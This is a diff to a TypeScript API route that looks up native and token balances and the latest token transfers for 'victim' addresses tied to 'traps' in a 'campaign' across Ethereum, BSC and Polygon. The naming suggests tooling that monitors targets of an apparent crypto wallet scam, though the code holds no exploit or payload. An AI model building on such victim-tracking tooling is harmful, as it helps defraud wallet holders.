@@ -5,6 +5,11 @@ import { createPublicClient, http, formatEther, formatUnits, fallback } from 'vi
 import { mainnet, bsc, polygon } from 'viem/chains';
 
 const chainMap = { ethereum: mainnet, bsc, polygon };
+const chainIdMap: Record<string, number> = {
+  ethereum: 1,
+  bsc: 56,
+  polygon: 137,
+};
 
 const tokenMap: Record<string, Record<string, string>> = {
   ethereum: {
@@ -37,7 +42,7 @@ const ERC20_ABI = [
   },
 ] as const;
 
-// ─── Public RPC Fallbacks (same as in balances route) ───
+// ─── Public RPC Fallbacks ───
 const PUBLIC_FALLBACKS: Record<string, string[]> = {
   bsc: [
     'https://bsc-dataseed.binance.org',
@@ -68,7 +73,7 @@ const PUBLIC_FALLBACKS: Record<string, string[]> = {
   ],
 };
 
-// ─── Simple in‑memory cache ───
+// ─── In‑memory cache for victim balances ───
 const balanceCache = new Map<string, { native: string; tokens: Record<string, string>; timestamp: number }>();
 const CACHE_TTL_MS = 60000; // 1 minute
 
@@ -107,6 +112,8 @@ export async function GET(
   if (campaignError || !campaign) {
     return NextResponse.json({ error: 'Campaign not found' }, { status: 404 });
   }
+
+  const chainId = chainIdMap[campaign.chain] || 1;
 
   const { searchParams } = new URL(req.url);
   const limit = parseInt(searchParams.get('limit') || '20', 10);
@@ -200,18 +207,45 @@ export async function GET(
       setCachedBalance(victim, nativeBalance, tokenBalances);
     }
 
-    // ─── Last transfer timestamp ───
+    // ─── Last transfer timestamp with chain_id filter ───
     let lastTransferAt = null;
     if (trap.counterparty_address) {
-      const { data: transfer } = await supabase
+      const victimLower = trap.victim_address.toLowerCase();
+      const counterpartyLower = trap.counterparty_address.toLowerCase();
+
+      // 1. Try exact match: victim → counterparty on the same chain
+      const { data: exact, error: exactError } = await supabase
         .from('token_transfers')
         .select('created_at')
-        .eq('sender', trap.victim_address.toLowerCase())
-        .eq('receiver', trap.counterparty_address.toLowerCase())
+        .eq('sender', victimLower)
+        .eq('receiver', counterpartyLower)
+        .eq('chain_id', chainId)  // ✅ ADD chain_id filter
         .order('created_at', { ascending: false })
         .limit(1);
-      if (transfer && transfer.length > 0) {
-        lastTransferAt = transfer[0].created_at;
+
+      if (exactError) {
+        console.warn(`[traps] Exact transfer query error for ${trap.id}:`, exactError);
+      } else if (exact && exact.length > 0) {
+        lastTransferAt = exact[0].created_at;
+        console.log(`[traps] Exact match found for ${trap.id}`);
+      } else {
+        // 2. Fallback: most recent transfer from victim to ANY address on the same chain
+        const { data: anyTransfer, error: anyError } = await supabase
+          .from('token_transfers')
+          .select('receiver, created_at')
+          .eq('sender', victimLower)
+          .eq('chain_id', chainId)  // ✅ ADD chain_id filter
+          .order('created_at', { ascending: false })
+          .limit(1);
+
+        if (anyError) {
+          console.warn(`[traps] Any transfer query error for ${trap.id}:`, anyError);
+        } else if (anyTransfer && anyTransfer.length > 0) {
+          lastTransferAt = anyTransfer[0].created_at;
+          console.log(`[traps] Fallback transfer found for ${trap.id} to ${anyTransfer[0].receiver}`);
+        } else {
+          console.log(`[traps] No transfers at all from ${victimLower} on chain ${chainId}`);
+        }
       }
     }
 
